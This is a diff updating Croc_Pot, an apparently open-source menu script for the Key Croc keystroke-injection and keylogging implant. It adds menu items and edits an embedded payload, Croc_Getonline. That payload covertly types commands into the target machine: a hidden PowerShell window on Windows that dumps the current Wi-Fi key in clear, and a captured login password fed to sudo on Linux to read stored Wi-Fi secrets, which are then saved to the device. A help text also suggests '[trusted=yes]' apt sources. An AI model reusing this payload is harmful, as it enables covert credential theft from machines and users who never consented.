@@ -4,7 +4,7 @@
 # Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
 #                SSH to HAK5 gear, Reverse ssh tunnel, and more
 # Author:        Spywill
-# Version:       1.8.8
+# Version:       1.8.9
 # Category:      Key Croc
 
 ##
@@ -574,12 +574,24 @@ ramdom_char() {
 	else
 		selected_color="$green"
 	fi
-	rand=$(printf '%x' $((RANDOM%256+1024)))
-	dec=$(printf "%d" "$((0x$rand))")
-	if [[ $dec -lt 1155 || $dec -gt 1161 ]]; then
-		printf "${selected_color} \u$rand"
+	default_char() {
+		special_chars=("!" "@" "#" "$" "%" "^" "&" "*" "(" ")" "_" "+" ":" ">" "<" "?" "," "." "/" "'" ";" "0" "1" "∞" "☼" "‼" "=" "X" "~")
+		rand_index=$(( RANDOM % ${#special_chars[@]} ))
+		selected_char=${special_chars[$rand_index]}
+		echo -ne "${selected_color} $selected_char"
+	}
+	if [ "$(OS_CHECK)" = WINDOWS ]; then
+		default_char
+	elif [ "$(OS_CHECK)" = LINUX ]; then
+		rand=$(printf '%x' $((RANDOM%256+1024)))
+		dec=$(printf "%d" "$((0x$rand))")
+		if [[ $dec -lt 1155 || $dec -gt 1161 ]]; then
+			printf "${selected_color} \u$rand"
+		else
+			echo -ne "${selected_color} #"
+		fi
 	else
-		echo -ne "${selected_color} #"
+		default_char
 	fi
 }
 ##
@@ -587,10 +599,10 @@ ramdom_char() {
 ##
 	while : ; do
 		ColorGreen "`tput cup 0 0`$clear\e[41;38;5;232;1m$LINE$clear
-$(ColorGreen '»»»»»»»»»»»» CROC_POT «««««««')$(ColorYellow 'VER:1.8.8')$(ramdom_char)$clear$(ColorYellow " $(hostname | awk '{ print toupper($0); }') IP: $(awk -v m=17 '{printf("%-17s\n", $0)}' <<< "$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)")")$(awk -v m=22 '{printf("%-22s\n", $0)}' <<< "$I_T")$clear
+$(ColorGreen '                 CROC_POT      ')$(ColorBlue 'V-1.8.9')$(ramdom_char)$clear$(ColorYellow " $(hostname | awk '{ print toupper($0); }') IP: $(awk -v m=17 '{printf("%-17s\n", $0)}' <<< "$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)")")$(awk -v m=22 '{printf("%-22s\n", $0)}' <<< "$I_T")$clear
 $(ColorBlue "AUTHOR: $(ColorYellow 'SPYWILL')")$(ColorCyan "  $(awk -v m=21 '{printf("%-21s\n", $0)}' <<< "$(uptime -p | sed 's/up/CROC UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g')")")$(ramdom_char)$clear$(ColorYellow " $(hostname | awk '{ print toupper($0); }') VER: $(cat /root/udisk/version.txt) ")$ICMP_STATUS*$clear$(ColorYellow "TARGET:$(ColorGreen "$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< "$(OS_CHECK)")")")
 $(ColorBlue "$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< "${croc_timezone^^}")")$(ColorCyan "$(date +%b-%d-%y-%r | awk '{ print toupper($0); }')")$(ramdom_char)$clear$(ColorYellow ' KEYBOARD:')$(ColorGreen "$(sed -n 9p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ")$(ColorYellow "ID:$(ColorGreen "${k_b^^}")")
-$(ColorGreen '»»»»»»»»»»»» ')$(ColorRed 'KEYCROC-HAK')\e[40m${array[0]}$clear$(ColorGreen ' ««««««««««««')$(ramdom_char)$clear$(ColorYellow " TEMP:$(ColorCyan "$(cat /sys/class/thermal/thermal_zone0/temp)°C")")$(ColorYellow " USAGE:$(ColorCyan "$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< "$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')")")")$(ColorYellow "MEM:$(ColorCyan "$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< "$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')")")")
+$(ColorRed '                 KEYCROC-HAK')\e[40m${array[0]}         $clear$(ramdom_char)$clear$(ColorYellow " TEMP:$(ColorCyan "$(cat /sys/class/thermal/thermal_zone0/temp)°C")")$(ColorYellow " USAGE:$(ColorCyan "$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< "$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')")")")$(ColorYellow "MEM:$(ColorCyan "$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< "$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')")")")
 \e[41;38;5;232;1m$LINE$clear`tput rc`"
 		[ "$broken" -eq 1 ] && break || sleep 5
 	done & title_pid=$!
@@ -636,15 +648,15 @@ function install_package() {
 ##
 function start_web() {
 	if [ "$(OS_CHECK)" = WINDOWS ]; then
-		Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "Start-Process ${1} ; exit" ; Q ENTER
+		Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "Start-Process $1 ; exit" ; Q ENTER
 	else
 		case "$HOST_CHECK" in
 			raspberrypi)
-				Q CONTROL-ALT-t ; sleep 1 ; Q STRING "chromium-browser ${1} & exit" ; Q ENTER ;;
+				Q CONTROL-ALT-d ; Q CONTROL-ALT-t ; sleep 1 ; Q STRING "xdg-open $1 & exit" ; Q ENTER ;;
 			"$HOST_CHECK")
-				Q ALT-t ; sleep 1 ; Q STRING "gio open ${1} & exit" ; Q ENTER ;;
+				Q CONTROL-ALT-d ; Q ALT-t ; sleep 1 ; Q STRING "xdg-open $1 & exit" ; Q ENTER ;;
 			*)
-				Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "gio open ${1} & exit" ; Q ENTER ;;
+				Q CONTROL-ALT-d ; Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "xdg-open $1 & exit" ; Q ENTER ;;
 		esac
 	fi
 }
@@ -671,7 +683,7 @@ function Panic_button() {
 	echo -ne "#!/bin/bash\nPID_WPA=\$(pidof wpa_supplicant)\nPID_DHC=\$(pidof dhclient)\nsleep 60\nifconfig wlan0 up\nkill -9 \$PID_WPA && kill -9 \$PID_DHC && wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0\nLED B\n" > /tmp/reset_net.txt
 	chmod +x /tmp/reset_net.txt
 	ColorRed '\n\nPanic button was pressed\nClosing all application opening login screen\nKilling wlan0 interface\nExit Croc_Pot\nRestore wlan0 interface in 1 min or unplug keycroc and plug back in\n\n'
-	ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
+	ifconfig wlan0 down ; bash /tmp/reset_net.txt &
 	if [ "$(OS_CHECK)" = WINDOWS ]; then
 		Q GUI r ; sleep 2
 		Q STRING "powershell Stop-Process -Name explorer ; Shutdown.exe /l /f"
@@ -5336,7 +5348,7 @@ else
 	read_all 'INSTALL CROC_GETONLINE PAYLOAD Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
-			echo -ne "# Title:           Croc_Getonline\n# Description:     Attempt to connect Keycroc automatically to target wifi access point\n#                  Save to tools/Croc_Pot/wifipass.txt and loot/Croc_Pot/old_wifipass.txt\n# Author:          spywill\n# Version:         3.5\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong, RootJunky, dark_pyrro\n
+			echo -ne "# Title:           Croc_Getonline\n# Description:     Attempt to connect Keycroc automatically to target wifi access point\n#                  Save to tools/Croc_Pot/wifipass.txt and loot/Croc_Pot/old_wifipass.txt\n# Author:          spywill\n# Version:         3.6\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong, RootJunky, dark_pyrro\n
 MATCH (getonline_W|getonline_R|getonline_L)\n\nCROC_POT_DIR=(/root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot)\nfor dir in \"\${CROC_POT_DIR[@]}\"; do [[ ! -d \"\$dir\" ]] && mkdir \"\$dir\" || LED B; done\n\nwifi_pass=/root/udisk/tools/Croc_Pot/wifipass.txt\n\nif [ -f \$wifi_pass ]; then\n	cat \$wifi_pass >> /root/udisk/loot/Croc_Pot/old_wifipass.txt
 	rm -f \$wifi_pass\nfi\n\nATTACKMODE HID STORAGE\nQ DELAY 5000\nLED ATTACK\n\ncase \$LOOT in\n	getonline_W)\n		Q GUI r\n		Q DELAY 3000\n		Q STRING \"powershell -NoP -NonI -W Hidden\"\n		Q ENTER\n		Q DELAY 5000\n		Q STRING \"\\\$MOUNT_POINT = (Get-WmiObject -Class win32_volume -Filter 'label=\\\"KeyCroc\\\"').DriveLetter\"
 		Q ENTER\n		Q DELAY 3000\n		Q STRING \"\\\$currentSSID = (netsh wlan show interfaces | Select-String \\\"SSID\\\")[0].ToString().Trim() -replace 'SSID\s+:\s+'\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"\\\$lastObject = (netsh wlan show profile name=\\\"\\\$currentSSID\\\" key=clear) | Select-String \\\"Key Content\W+:(.+)\\\$\\\" | ForEach-Object {\\\$pass=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=\\\$currentSSID;PASSWORD=\\\$pass }} | Select-Object -Last 1\"
@@ -5345,7 +5357,7 @@ MATCH (getonline_W|getonline_R|getonline_L)\n\nCROC_POT_DIR=(/root/udisk/loot/Cr
 		Q ENTER\n		Q DELAY 2000\n		Q STRING \"echo \\\"\\\$currentSSID \\\$SSID_pw\\\" | tee \\\$MOUNT_POINT/tools/Croc_Pot/wifipass.txt\"\n		Q ENTER\n		Q DELAY 3000\n		Q STRING \"umount \\\$MOUNT_POINT ; exit\"\n		Q ENTER\n;;\n	getonline_L)\n		if [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then
 			PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\n		else\n			PC_PW=LINUX\n		fi\n		Q CONTROL-ALT-d\n		Q ALT-t\n		Q DELAY 2000\n		Q STRING \"MOUNT_POINT=\\\"/mnt/usb\\\" ; sudo mkdir -p \\\$MOUNT_POINT ; sudo mount -L \\\"KeyCroc\\\" \\\$MOUNT_POINT\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"\$PC_PW\"
 		Q ENTER\n		Q DELAY 2000\n		Q STRING \"currentSSID=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"SSID_pw=\\\$(sudo grep -r '^psk=' /etc/NetworkManager/system-connections/\\\$currentSSID* | sed -e 's/psk=//g')\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"echo \\\"\\\$currentSSID \\\$SSID_pw\\\" | sudo tee \\\$MOUNT_POINT/tools/Croc_Pot/wifipass.txt\"
-		Q ENTER\n		Q DELAY 3000\n		Q STRING \"sudo umount \\\$MOUNT_POINT ; exit\"\n		Q ENTER\n;;\nesac\n\nATTACKMODE HID\nsleep 3\n\nLED SETUP\nkill -9 \$(pidof wpa_supplicant) && kill -9 \$(pidof dhclient)\nifconfig wlan0 down\n\nif [ \"\$LOOT\" = \"getonline_W\" ]; then\n	sed -i '0,/./s/^.//' \$wifi_pass\n	sed -i 's/\\\r//g' \$wifi_pass\nfi\n
+		Q ENTER\n		Q DELAY 3000\n		Q STRING \"sudo umount \\\$MOUNT_POINT ; exit\"\n		Q ENTER\n;;\nesac\n\nATTACKMODE HID\nsleep 3\n\nLED SETUP\nkill -9 \$(pidof wpa_supplicant) && kill -9 \$(pidof dhclient)\nifconfig wlan0 down\n\nif [ \"\$LOOT\" = \"getonline_W\" ]; then\n	sed -i -e '1s/^[^[:print:]]*//' \$wifi_pass\n	sed -i 's/\\\r//g' \$wifi_pass\nfi\n
 sed -i 's/\( \)*/\1/g' \$wifi_pass\nsed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt\nsed -i -E -e '1{x;s#^#sed -n 1p '\$wifi_pass'#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt\nwpa_passphrase \$(sed 's/ .*//' \$wifi_pass) \$(sed 's/.* //' \$wifi_pass) > /etc/wpa_supplicant.conf\nifconfig wlan0 up
 wpa_supplicant -B -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf && dhclient wlan0\nsleep 3\nsystemctl restart ssh.service\n\n[ : >/dev/tcp/8.8.8.8/53 ] && LED FINISH || LED R\nsleep 3\nLED OFF\n" > "$CROC_GETONLINE"
 			cat "$CROC_GETONLINE" ; echo -ne "\n$LINE\n"
@@ -6795,7 +6807,8 @@ omg_check() {
 	MenuColor 21 3 'O.MG GITHUB PAGE'
 	MenuColor 21 4 'O.MG AP PAYLOAD'
 	MenuColor 21 5 'O.MG LOCAL NETWORK'
-	MenuColor 21 6 'RETURN TO MAIN MENU'
+	MenuColor 21 6 'O.MG WEB FLASHER'
+	MenuColor 21 7 'RETURN TO MAIN MENU'
 	MenuEnd 20
 	case "$m_a" in
 		1) omg_wifi ; omg_cable ;;
@@ -6803,7 +6816,8 @@ omg_check() {
 		3) start_web https://github.com/O-MG ; omg_cable ;;
 		4) omg_quick_connect ;;
 		5) omg_check ; omg_cable ;;
-		6) main_menu ;;
+		6) start_web https://o-mg.github.io/WebFlasher ; omg_cable ;;
+		7) main_menu ;;
 		0) exit ;;
 		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; omg_cable ;;
 	esac
@@ -7439,6 +7453,10 @@ elif [ "$(OS_CHECK)" = LINUX ]; then
 else
 	ColorRed '\nPLEASE RUN CROC_POT PAYLOAD TO GET TARGET USER NAME AND IP\n'
 fi
+if [ -f /root/udisk/tools/Croc_Pot/Target_File_Structure.txt ]; then
+	ColorYellow "Target File Structure:" ; sleep 2
+	cat /root/udisk/tools/Croc_Pot/Target_File_Structure.txt | more
+fi
 }
 ##
 #----Status keystrokes croc_char.log file menu/function
@@ -7656,6 +7674,102 @@ clean_log() {
 	esac
 }
 ##
+#----Converts an input string containing alphanumeric characters to binary, hex, key-code, Unicode, octal, URL encoded, Base64 encoded
+##
+Convert_input() {
+	Info_Screen 'The code reads a single character at a time from user input.
+For each character:
+  It calculates the ASCII value.
+  Converts the ASCII value to binary, hex, key code, Unicode, octal,
+  URL-encoded, and Base64 representations.
+
+The code outputs the calculated representations for each character.
+PRESS CTRL + C to break loop in terminal.'
+	read_all 'START CONVERT INPUT Y/N AND PRESS [ENTER]'
+	case "$r_a" in
+		[yY] | [yY][eE][sS])
+			reset_broken
+			while [ "$broken" -eq 1 ] && break || read -r -n 1 input_string; do
+				binary=""
+				hex=""
+				key_code=""
+				unicode=""
+				octal=""
+				url_encoded=""
+				base64_encoded=""
+				if [[ $input_string == $'\e' ]]; then
+					key_combination=""
+					read -rsn 2 input_string
+					key_combination+="$input_string"
+				else
+					for (( i=0; i<${#input_string}; i++ )); do
+						char=${input_string:i:1}
+						ascii=$(printf "%d" "'$char")
+						for (( j=7; j>=0; j-- )); do
+							bit=$(( (ascii >> j) & 1 ))
+							binary+="$bit"
+						done
+						binary+=" "
+						hex+="$(printf "%02x" "$ascii") "
+						key_code+="$(printf "%d" "'$char") "
+						unicode+="\u$(printf "%04x" "$ascii") "
+						octal+="\\$(printf "%03o" "$ascii") "
+						url_encoded+="$(printf "%%%02x" "$ascii")"
+						base64_encoded+=$(printf "%s" "$char" | base64)
+					done
+				fi
+				echo -ne " ${yellow}Binary:${cyan}$binary${yellow}Hex:${cyan}$hex${yellow}Key-code:${cyan}$key_code${yellow}Unicode:$clear" ; echo -n "$unicode" ; echo -ne "${yellow}Octal:${cyan}$octal${yellow}URL:${cyan}$url_encoded${yellow} Base64:${cyan}$base64_encoded$clear\n"
+			done ;;
+		[nN] | [nN][oO])
+			ColorYellow 'Maybe next time\n' ;;
+		*)
+			invalid_entry ;;
+	esac
+}
+##
+#----QUACK TEST, test keycroc keystroke injection
+##
+quack_test() {
+	Info_Screen 'Test keycroc keystroke injection
+QUACK TEST:
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-10-8-7-6-5-4-3-2-1!@#$%^&
+
+Window run in notepad
+Linux run in terminal'
+	TEST_QUACK() {
+		for test_quack in {a..z} {A..Z} {-10..-1} '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '_' '+' '=' '[' ']' '\\' ';' ':' '\"' '<' ',' '>' '.' '?' '\/'; do
+			Q STRING "$test_quack"
+			ColorYellow "$test_quack"
+		done
+		ColorGreen 'Test is complete\n' ; sleep 5
+	}
+	read_all 'START QUACK TEST Y/N AND PRESS [ENTER]'
+	case "$r_a" in
+		[yY] | [yY][eE][sS])
+			if [ "$(OS_CHECK)" = WINDOWS ]; then
+				Q GUI m ; Q GUI r ; Q DELAY 2000 ; Q STRING "notepad" ; Q ENTER ; Q DELAY 5000
+				TEST_QUACK && Q CONTROL-a ; Q BACKSPACE ; Q ALT-F4
+			elif [ "$(OS_CHECK)" = LINUX ]; then
+				case "$HOST_CHECK" in
+					raspberrypi)
+						Q CONTROL-ALT-d ; Q CONTROL-ALT-t ; Q DELAY 2000
+						TEST_QUACK && Q ENTER ; Q STRING "exit" ; Q ENTER ;;
+					"$HOST_CHECK")
+						Q CONTROL-ALT-d ; Q ALT-t ; Q DELAY 2000
+						TEST_QUACK && Q ENTER ; Q STRING "exit" ; Q ENTER ;;
+					*)
+						TEST_QUACK && Q ENTER ; Q STRING "exit" ; Q ENTER ;;
+				esac
+			else
+				TEST_QUACK && Q ENTER ; Q STRING "exit" ; Q ENTER
+			fi ;;
+		[nN] | [nN][oO])
+			ColorYellow 'Maybe next time\n' ;;
+		*)
+			invalid_entry ;;
+	esac
+}
+##
 #----keycroc loot/croc_char.log menu
 ##
 	MenuTitle 'LOOT/CROC CHAR.LOG MENU'
@@ -7664,7 +7778,9 @@ clean_log() {
 	MenuColor 21 3 'MATCH WORD LIST SCAN'
 	MenuColor 21 4 'VIEW CROC CHAR.LOG'
 	MenuColor 21 5 'CLEAN CHAR.LOG FILES'
-	MenuColor 21 6 'RETURN TO MAIN MENU'
+	MenuColor 21 6 'CONVERT INPUT'
+	MenuColor 21 7 'QUACK TEST'
+	MenuColor 21 8 'RETURN TO MAIN MENU'
 	MenuEnd 20
 	case "$m_a" in
 		1) keystrokes_V ; key_file ;;
@@ -7672,7 +7788,9 @@ clean_log() {
 		3) list_check ; key_file ;;
 		4) view_key ; key_file ;;
 		5) clean_log ; key_file ;;
-		6) main_menu ;;
+		6) Convert_input ; key_file ;;
+		7) quack_test ; key_file ;;
+		8) main_menu ;;
 		0) exit ;;
 		[pP]) Panic_button ;; [bB]) menu_A ;; *) invalid_entry ; key_file ;;
 	esac
@@ -7771,7 +7889,8 @@ The column headings in the process list are as follows:
 -COMMAND: The command name or command line [ name + options ].
 The status of the process can be one of the following:
 -D: Uninterruptible sleep
--R: Running -S: Sleeping
+-R: Running
+-S: Sleeping
 -T: Traced [ stopped ]
 -Z: Zombie
 
@@ -8077,7 +8196,7 @@ mc_remove() {
 	esac
 }
 ##
-#----Edit menu- Midnight Menu
+#----Midnight Menu
 ##
 	MenuTitle 'MIDNIGHT COMMANDER MENU'
 	MenuColor 26 1 'INSTALL MIDNIGHT COMMANDER'
@@ -8095,7 +8214,7 @@ mc_remove() {
 	esac
 }
 ##
-#----Edit menu- Display Edit Menu
+#----Edit menu
 ##
 	MenuTitle 'CROC EDIT MENU'
 	MenuColor 22 1 'CROC PAYLOADS FOLDER' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 22 8 'ATTACKMODE HID' | sed 's/\t//g'
@@ -9339,7 +9458,14 @@ remove_croc_pot() {
 ##
 croc_update() {
 	Info_Screen '-Update/Upgrade KeyCroc Packages
--NOTE: This could break important Packages the keycroc needs to work properly'
+-NOTE: This could break important Packages the keycroc needs to work properly
+
+Edit (/etc/apt/sources.list) fix package fail to install
+
+deb [trusted=yes] http://archive.debian.org/debian/ jessie-backports main
+#deb-src http://archive.debian.org/debian/ jessie-backports main
+deb [trusted=yes] http://archive.debian.org/debian jessie main contrib non-free
+#deb-src http://httpredir.debian.org/debian jessie main contrib non-free'
 	read_all 'UPDATE KEYCROC PACKAGES Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
@@ -9571,6 +9697,29 @@ terminate the connection (if a PID was found)'
 	esac
 }
 ##
+#----Reformat the keycroc udisk, udisk partition is formatted in the FAT32 file system
+##
+reformat_udisk() {
+	Info_Screen 'Reformat the Keycroc udisk partition
+The udisk partition is formatted in the FAT32 file system for maximum
+compatibility with various targets Windows, Mac, Linux, etc.
+
+NOTE: This will remove anything you previously have stored on the udisk
+such as payloads, loot, etc.'
+df -h /root/udisk
+	read_all 'REFORMAT KEYCROC UDISK PARTITION Y/N AND PRESS [ENTER]'
+	case "$r_a" in
+		[yY] | [yY][eE][sS])
+			ColorRed 'Reformat the Keycroc udisk partition\n'
+			ColorYellow 'May need to unplug keycroc and plug back in\n'
+			udisk reformat ;;
+		[nN] | [nN][oO])
+			ColorYellow 'Maybe next time\n' ;;
+		*)
+			invalid_entry ;;
+	esac
+}
+##
 #----Recovery main menu
 ##
 	MenuTitle 'KEYCROC RECOVERY MENU'
@@ -9585,11 +9734,15 @@ terminate the connection (if a PID was found)'
 	MenuColor 27 9 'MAC ADDRESS CHANGER'
 	MenuColor 26 10 'RESET WIRELESS NETWORK'
 	MenuColor 26 11 'TERMINATE CONNECTION'
-	MenuColor 26 12 'RETURN TO MAIN MENU'
+	MenuColor 26 12 'REFORMAT UDISK PARTITION'
+	MenuColor 26 13 'RETURN TO MAIN MENU'
 	MenuEnd 26
 	case "$m_a" in
 		1) croc_firmware ; croc_recovery ;;
-		2) start_web https://docs.hak5.org/key-croc/ ; croc_recovery ;;
+		2) websites=("https://docs.hak5.org/key-croc/" "https://forums.hak5.org/" "https://shop.hak5.org/" "https://discord.com/invite/QfmZFTyTY2")
+			for url in "${websites[@]}"; do
+				start_web "$url" ; sleep 3
+			done ; croc_recovery ;;
 		3) locale_en_US ; croc_recovery ;;
 		4) croc_update ; croc_recovery ;;
 		5) remove_croc_pot ;;
@@ -9599,7 +9752,8 @@ terminate the connection (if a PID was found)'
 		9) mac_changer ; croc_recovery ;;
 		10) reset_wifi ; croc_recovery ;;
 		11) terminate_ip ; croc_recovery ;;
-		12) main_menu ;;
+		12) reformat_udisk ; croc_recovery ;;
+		13) main_menu ;;
 		0) exit ;;
 		[bB]) main_menu ;; [pP]) Panic_button ;; *) invalid_entry ; croc_recovery ;;
 	esac
